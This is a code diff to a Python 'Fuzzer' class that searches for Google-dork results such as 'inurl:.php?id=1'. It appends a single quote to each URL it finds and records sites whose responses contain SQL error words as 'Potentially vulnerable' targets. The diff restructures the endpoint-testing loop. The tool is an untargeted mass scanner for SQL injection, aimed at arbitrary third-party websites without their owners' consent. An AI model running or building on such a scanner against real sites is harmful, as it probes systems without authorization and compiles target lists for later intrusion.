@@ -10,7 +10,7 @@ import re
 
 class Fuzzer(object):
 
-    def __init__(self, pages=3):
+    def __init__(self, pages=1):
         self.queries = [
                 "inurl%3A+.php%3Fid%3D1",
                 "inurl%3A+.php%3Fid%3D2",
@@ -70,7 +70,8 @@ class Fuzzer(object):
     def run_scan(self):
         for query in self.queries:
             results = self.get_endpoints(query)
-            self.test_endpoints(results)
+            for item in results:
+                self.test_endpoint(item)
             print("Sending bogus query and sleeping additional 15 seconds")
             self._send_bogus_query()
             sleep(15)
@@ -90,23 +91,24 @@ class Fuzzer(object):
             sleep(15)
         return results
 
-    def test_endpoints(self, results):
+    def test_endpoint(self, item):
         relist = ["sql", "syntax"]
-        for item in results:
-            if not self._skip_url(item):
-                url = "%s'" % item.split('&')[0]
-                if not self.session._target_exists_in_db(url):
-                    print("Testing %s" % url)
-                    try:
-                        response = self.websession.get(url, timeout=5)
-                    except KeyboardInterrupt:
-                        exit(1)
-                    except:
-                        print("Yucky URL: %s'" % url)
+        if not self._skip_url(item):
+            url = "%s'" % item.split('&')[0]
+            if "http" not in url:
+                url = "http://%s" % url
+            if not self.session._target_exists_in_db(url):
+                print("Testing %s" % url)
+                try:
+                    response = self.websession.get(url, timeout=5)
+                except:
+                    print("Yucky URL: %s" % url)
+                    return
+                for regex in relist:
+                    if re.search(regex, response.text.lower()):
+                        print("Potentially vulnerable: %s" % url)
+                        self.session.add_target(url)
+                        return
+                    else:
                         continue
-                    for regex in relist:
-                        if re.search(regex, response.text.lower()):
-                            print("Potentially vulnerable: %s" % url)
-                            self.session.add_target(url)
-                        else:
-                            continue
+
